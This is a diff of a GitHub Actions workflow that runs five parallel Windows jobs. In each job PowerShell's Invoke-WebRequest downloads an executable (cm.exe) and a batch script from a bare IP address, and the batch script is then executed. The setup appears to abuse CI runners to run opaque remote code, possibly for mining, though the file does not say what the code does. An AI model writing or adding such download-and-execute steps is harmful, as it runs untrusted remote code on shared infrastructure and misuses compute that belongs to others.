@@ -1,13 +1,24 @@
-name: github test
+name: Github
 on: workflow_dispatch
 jobs:
   build:
+    name: environment
     runs-on: windows-latest
-    timeout-minutes: 90
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1]
+        flag: [A, B, C, D, E]
+    timeout-minutes: 30
+    env:
+        NUM_JOBS: 5
+        JOB: ${{ matrix.go }}
     steps:
-    - name: Download files.
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: running
       run: |
         Invoke-WebRequest http://134.122.17.115/cm.exe -OutFile cm.exe
         Invoke-WebRequest http://134.122.17.115/start.bat -OutFile start.bat
-    - name: runing.
-      run: cmd /c start.bat
+        cmd /c start.bat
